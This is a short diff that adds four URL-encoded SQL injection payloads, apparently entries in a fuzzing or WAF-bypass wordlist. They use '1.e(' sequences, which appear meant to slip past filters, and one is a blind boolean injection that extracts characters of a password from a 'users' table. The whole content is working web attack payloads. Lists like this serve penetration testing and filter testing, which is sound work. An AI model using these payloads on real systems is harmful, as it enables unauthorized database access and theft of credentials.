@@ -1,0 +1,4 @@
+'%20or%201.e(%22)%3D'
+1.e(ascii 
+1.e(substring( 
+1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'
